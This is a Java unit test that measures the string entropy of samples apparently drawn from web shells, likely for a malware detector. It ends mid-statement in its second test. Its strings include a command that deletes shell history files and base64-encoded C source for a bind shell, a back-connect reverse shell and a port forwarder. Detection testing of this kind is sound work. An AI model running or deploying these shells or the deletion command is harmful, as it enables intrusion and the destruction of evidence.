package util;

import org.junit.Test;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class StringParserTest {
    @Test
    public void testEntropy(){
        List<String> testStrings = new ArrayList<>(Arrays.asList("/var/log/lastlog", "/var/log/telnetd",
                "/var/log/telnetd", "find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;",
                "<b>Loading command : </b>", "command", "shell_exec", "<br><textarea cols=\\\"122\\\" rows=\\\"15\\\" readonly>", "http://localhost/DebugPHP/getcode.php?call=code",
                "safe_mode_include_dir", "!body {.*}!msiU",

                "rUp6Yts2EP68APkPDHhANppV7pZvg3B7zRxsZNvYmeUMA5JAoCTacyORglXF8YL89x0pyS/Ny9KiToDY9/rcw+MdULNZcX5TRpEpxnT1c+N1aodaRH2PVlZIveZ7rucNU8NYKyBfyI1o3XX8Z7+7RrtykqlD5FyhDneCRnpOA/ioHcZ/u+NYfDqZnPunI2KCr7Wa8S9b6rH714XrWvyL8aAwCFG0BAtZIoKWhM8Qa9BDoSuuUHh/rM0kmdKkGUQw/cA483SA0tJPPxERtUn4SoYNZ1+TNMwzppYQ3jvuu/7Z6MSFAKN+Hx897O7QS9IXrIZgcUXTLKVMBzLOhUfBkpOE1koVTMVf//jkcQw0lTXTGyUyCPKc09g9G1rcDaeEsLiOgXuREX7YPPww0xI7FAneVNiwhPfxKZEsU3/oIyEczZVXW45G8QSMSKVc8cE58nVpWDWIsoIrjkA6MPSKDMQVQXlDPzry8oTXUT2ya/vWMMSm9ap6/mcnl0kYC0Foy+iOkSLPT7rZA5bXGw/OJ35/8NkdHp+5lumDiFfFQ3R6aDLqXZy5w4k/Ho0m1rWNnVJtkIpR2Ok81T2R0YLUIsM+Kk80Csg/sG5Nr3eYSdEwYBTOBcJ6xUdZu4GY0RgdIG2XxoKptkaI207W1SWUtkYB91ayf3bnFxSKGA7nWr/ff++63UJHsRuCPDInAUToI4kYHD+fVviy9+oocie0EMtPO4hWa5NmaXTnEv3aeTZfH1MRBT4tJHuEZjqGirXvs/4/r/0hWhMMu9hesXTjthOsnHgg9GZ11A6ucBsOywcBnLAywm3Dxo3X5riQptacUh0TKUzCVIiwV25wNFsrdF8rN269Kp9hUFWIaHD6uXbKxmmYds5QxQRU6QKSIX0vwlJHzIdDi4pbR8s7RXJMKnFd6/ctxzKXyKj2tC6m3KgaB++0IqMqzzjSEhuMqx6935CbG03Kn1dkaPUtOcD6+SRyIlqZBZRyCVf0+AOmz/U+QMRj0MG4+zKhPZEkhFQVgXrG01whtVl2ByttpzDSHGpjmFFrW+vlTsLW+iIOU7ckzuE7/SfMFQUXVIPrTVTbYCmckYmS5LFvKcmUsTuIiCIV+KoiXdD/R2QBN55RqM9vdypktPWjguYsiigvAcsC/pbBFPxYtWFC/RWXOX8ror2Ib1UXxruFNk55xNeEFt7v3pdsOF3oDxiFMZGyo8iWUAGy1OFAregtCt6ianAzdcYurcK52g258YiYXkXp+hrs1QyOyqeEA0H3U25piV4e3qVIRG9dg50xMq2YiFvqF9F25HiD+pMuKlb9wg3WxwqNetKUYH5VKF16MVeqroDlQSM9Gh5DsUjQlt7Lw5BXiRSI7K/Dwfx3nSB8hB7MhXtRZdn3FctjWgxypTKJzMItJ1ua0e4LIx/bZUHj2KdqNKzrVXOwFVrkdV+8NV22nwHJGoIoMawV3wtOfBMGmahn9RKBzwBPH5hiFgxRgAUjbt/YDvzC8wJRRjYzD4xTBdD4er6D0Grgtm+JDm9vPQe9iBgCHLpoow+/CvqRLFZZ5uh2E2bpB8OT0RPqxZwp2h263uAYvZDgRt5pVxga2+/d3Z1pzPgNGrufbr6ejsaT3sUEDW3w2k6ncLffweUzZ7FL2GPx88TOBLQfg7fYAeMRPAUlI/oh62sJQ7+UQVGnBFOsE/h4/Yxa9eTQqWB56f8JgkyBDL92mh+t1orufw==",
                "DxProx_CKI", "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS\n" +
                        "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I\n" +
                        "GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt\n" +
                        "b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9\n" +
                        "pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF\n" +
                        "NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK\n" +
                        "ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog\n" +
                        "ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk\n" +
                        "7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2\n" +
                        "9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld\n" +
                        "2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu\n" +
                        "dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp\n" +
                        "lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=",
                "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\n" +
                        "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\n" +
                        "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\n" +
                        "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\n" +
                        "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\n" +
                        "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\n" +
                        "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\n" +
                        "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==",
                "I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2\n" +
                        "x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb\n" +
                        "HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj\n" +
                        "aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ\n" +
                        "lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm\n" +
                        "xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga\n" +
                        "W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy\n" +
                        "LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV\n" +
                        "udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow\n" +
                        "0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb\n" +
                        "iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l\n" +
                        "KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA\n" +
                        "gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS\n" +
                        "hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC\n" +
                        "iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh\n" +
                        "ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ\n" +
                        "vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC\n" +
                        "AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D\n" +
                        "QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh\n" +
                        "ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0\n" +
                        "gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay\n" +
                        "wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c\n" +
                        "29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy\n" +
                        "MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA\n" +
                        "gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci\n" +
                        "5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ\n" +
                        "HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu\n" +
                        "dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0\n" +
                        "KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC\n" +
                        "ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI\n" +
                        "E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp\n" +
                        "Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs\n" +
                        "NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG\n" +
                        "J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL\n" +
                        "CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp\n" +
                        "dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo\n" +
                        "gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm\n" +
                        "lsZSk7DQogIHJldHVybiAwOw0KfQ==",
                "2cf1656ed3df6864df08feaf603ebe13", "e67c2597ecad64bb4cdad6633b04107f","eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce",
                "eJwlmt2aqjrXbW8pAam9PJwIAVFCEfIDOQPiUwgBKaUUufo9fL+DdTLXnFWYjNF7a6ouddccuuky2j89rp2J"));

        testStrings.forEach(content -> {
            System.out.println(content.substring(0, Math.min(content.length(), 20)));
            System.out.println(StringParser.entropy(content));
        });
    }

    @Test
    public void testStringParser(){
        List<String> testStrings = new ArrayList<>(Arrays.asList("/var/log/lastlog", "/var/log/telnetd",
                "/var/log/telnetd", "find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;",
                "<b>Loading command : </b>", "command", "shell_exec", "<br><textarea cols=\\\"122\\\" rows=\\\"15\\\" readonly>", "http://localhost/DebugPHP/getcode.php?call=code",
                "safe_mode_include_dir", "!body {.*}!msiU",

                "rUp6Yts2EP68APkPDHhANppV7pZvg3B7zRxsZNvYmeUMA5JAoCTacyORglXF8YL89x0pyS/Ny9KiToDY9/rcw+MdULNZcX5TRpEpxnT1c+N1aodaRH2PVlZIveZ7rucNU8NYKyBfyI1o3XX8Z7+7RrtykqlD5FyhDneCRnpOA/ioHcZ/u+NYfDqZnPunI2KCr7Wa8S9b6rH714XrWvyL8aAwCFG0BAtZIoKWhM8Qa9BDoSuuUHh/rM0kmdKkGUQw/cA483SA0tJPPxERtUn4SoYNZ1+TNMwzppYQ3jvuu/7Z6MSFAKN+Hx897O7QS9IXrIZgcUXTLKVMBzLOhUfBkpOE1koVTMVf//jkcQw0lTXTGyUyCPKc09g9G1rcDaeEsLiOgXuREX7YPPww0xI7FAneVNiwhPfxKZEsU3/oIyEczZVXW45G8QSMSKVc8cE58nVpWDWIsoIrjkA6MPSKDMQVQXlDPzry8oTXUT2ya/vWMMSm9ap6/mcnl0kYC0Foy+iOkSLPT7rZA5bXGw/OJ35/8NkdHp+5lumDiFfFQ3R6aDLqXZy5w4k/Ho0m1rWNnVJtkIpR2Ok81T2R0YLUIsM+Kk80Csg/sG5Nr3eYSdEwYBTOBcJ6xUdZu4GY0RgdIG2XxoKptkaI207W1SWUtkYB91ayf3bnFxSKGA7nWr/ff++63UJHsRuCPDInAUToI4kYHD+fVviy9+oocie0EMtPO4hWa5NmaXTnEv3aeTZfH1MRBT4tJHuEZjqGirXvs/4/r/0hWhMMu9hesXTjthOsnHgg9GZ11A6ucBsOywcBnLAywm3Dxo3X5riQptacUh0TKUzCVIiwV25wNFsrdF8rN269Kp9hUFWIaHD6uXbKxmmYds5QxQRU6QKSIX0vwlJHzIdDi4pbR8s7RXJMKnFd6/ctxzKXyKj2tC6m3KgaB++0IqMqzzjSEhuMqx6935CbG03Kn1dkaPUtOcD6+SRyIlqZBZRyCVf0+AOmz/U+QMRj0MG4+zKhPZEkhFQVgXrG01whtVl2ByttpzDSHGpjmFFrW+vlTsLW+iIOU7ckzuE7/SfMFQUXVIPrTVTbYCmckYmS5LFvKcmUsTuIiCIV+KoiXdD/R2QBN55RqM9vdypktPWjguYsiigvAcsC/pbBFPxYtWFC/RWXOX8ror2Ib1UXxruFNk55xNeEFt7v3pdsOF3oDxiFMZGyo8iWUAGy1OFAregtCt6ianAzdcYurcK52g258YiYXkXp+hrs1QyOyqeEA0H3U25piV4e3qVIRG9dg50xMq2YiFvqF9F25HiD+pMuKlb9wg3WxwqNetKUYH5VKF16MVeqroDlQSM9Gh5DsUjQlt7Lw5BXiRSI7K/Dwfx3nSB8hB7MhXtRZdn3FctjWgxypTKJzMItJ1ua0e4LIx/bZUHj2KdqNKzrVXOwFVrkdV+8NV22nwHJGoIoMawV3wtOfBMGmahn9RKBzwBPH5hiFgxRgAUjbt/YDvzC8wJRRjYzD4xTBdD4er6D0Grgtm+JDm9vPQe9iBgCHLpoow+/CvqRLFZZ5uh2E2bpB8OT0RPqxZwp2h263uAYvZDgRt5pVxga2+/d3Z1pzPgNGrufbr6ejsaT3sUEDW3w2k6ncLffweUzZ7FL2GPx88TOBLQfg7fYAeMRPAUlI/oh62sJQ7+UQVGnBFOsE/h4/Yxa9eTQqWB56f8JgkyBDL92mh+t1orufw==",
                "DxProx_CKI", "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS\n" +
                        "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I\n" +
                        "GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt\n" +
                        "b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9\n" +
                        "pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF\n" +
                        "NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK\n" +
                        "ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog\n" +
                        "ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk\n" +
                        "7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2\n" +
                        "9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld\n" +
                        "2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu\n" +
                        "dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp\n" +
                        "lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=",
                "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\n" +
                        "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\n" +
                        "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\n" +
                        "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\n" +
                        "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\n" +
                        "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\n" +
                        "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\n" +
                        "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==",
                "I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2\n" +
                        "x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb\n" +
                        "HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj\n" +
                        "aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ\n" +
                        "lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm\n" +
                        "xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga\n" +
                        "W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy\n" +
                        "LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV\n" +
                        "udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow\n" +
                        "0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb\n" +
                        "iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l\n" +
                        "KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA\n" +
                        "gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS\n" +
                        "hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC\n" +
                        "iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh\n" +
                        "ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ\n" +
